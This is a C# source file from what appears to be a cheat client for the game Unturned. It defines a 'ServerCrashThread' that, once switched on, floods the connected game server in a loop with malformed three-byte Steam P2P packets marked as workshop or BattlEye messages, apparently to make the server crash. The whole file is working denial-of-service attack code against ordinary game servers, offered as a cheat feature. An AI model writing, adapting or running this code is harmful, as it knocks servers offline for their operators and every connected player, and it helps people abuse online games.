using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading;
using System.Xml.Schema;
using SDG.Unturned;
using Steamworks;    
using Thanking.Attributes;
using Thanking.Options;
using Thanking.Overrides;
using Thanking.Utilities;
using UnityEngine;

namespace Thanking.Threads
{
    public static class ServerCrashThread
    {
        public static bool ServerCrashEnabled;
        public static bool AlwaysCrash;
        
        [Thread]
        public static void Start()
        {
            Provider.onClientDisconnected += () =>
            {
                ServerCrashEnabled = false;
                OV_Provider.IsConnected = false;
            };

            byte[] P1 = { (byte) ESteamPacket.WORKSHOP, 0, 0 };
            byte[] P2 = { (byte) ESteamPacket.BATTLEYE, 0, 0 };
            
            while (true)
            {
                if (OV_Provider.IsConnected && (ServerCrashEnabled || AlwaysCrash))
                {
                    switch (MiscOptions.SCrashMethod)
                    {
                        case 1:
                            SteamNetworking.SendP2PPacket(Provider.server, P1, 3, EP2PSend.k_EP2PSendUnreliableNoDelay, 0);
                            break;
                        case 2:
                            SteamNetworking.SendP2PPacket(Provider.server, P2, 3, EP2PSend.k_EP2PSendUnreliableNoDelay, 0);
                            break;
                    }
                }
                else
                    Thread.Sleep(1000);
            }
        }
    }
}
